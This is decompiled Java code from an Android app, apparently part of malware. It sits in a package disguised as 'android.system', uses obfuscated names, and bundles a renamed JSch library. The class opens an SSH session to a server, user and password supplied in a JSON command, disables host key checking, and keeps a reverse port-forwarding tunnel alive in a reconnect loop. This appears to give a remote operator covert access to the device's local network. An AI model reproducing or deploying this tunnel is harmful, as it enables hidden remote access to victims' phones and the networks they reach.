package android.system.sa;

import android.app.Service;
import android.system.f.YM;
import com.jcraft.jsch.es.JSch;
import com.jcraft.jsch.es.JSchException;
import com.jcraft.jsch.es.Session;
import java.io.IOException;
import java.util.Properties;
import org.json.JSONException;
import org.json.JSONObject;


public class PortForwardingR {
    private static JSONObject a;
    private static Session b;
    private static boolean c = true;

    public static void a() {
        c = false;
    }

    public static void a(final Service service, JSONObject jSONObject) throws JSONException, JSchException, NumberFormatException {
        c = true;
        a = jSONObject;
        final int iIntValue = Integer.valueOf(a.getString("rport")).intValue();
        final String string = a.getString("lhost");
        final int iIntValue2 = Integer.valueOf(a.getString("lport")).intValue();
        JSch jSch = new JSch();
        String string2 = a.getString("host");
        String string3 = a.getString("user");
        Properties properties = new Properties();
        properties.put("StrictHostKeyChecking", "no");
        Logger9.a("jsch.getSession");
        b = jSch.getSession(string3, string2, Integer.valueOf(a.getString("port")).intValue());
        b.setConfig(properties);
        b.setPassword(a.getString("password"));
        new Thread(new Runnable() { // from class: android.system.sa.c.1
            @Override // java.lang.Runnable
            public void run() throws InterruptedException, IOException {
                while (PortForwardingR.c) {
                    if (!PortForwardingR.b.isConnected()) {
                        try {
                            PortForwardingR.b.connect();
                            PortForwardingR.b.setPortForwardingR(iIntValue, string, iIntValue2);
                            Logger9.a("connected");
                        } catch (Exception e) {
                            Logger9.a(e.toString());
                            YM.a(service, "exit", e.toString());
                            service.stopSelf();
                        }
                        try {
                            Thread.sleep(500L);
                        } catch (InterruptedException e2) {
                        }
                    }
                }
                if (PortForwardingR.b != null) {
                    PortForwardingR.b.disconnect();
                }
            }
        }).start();
    }
}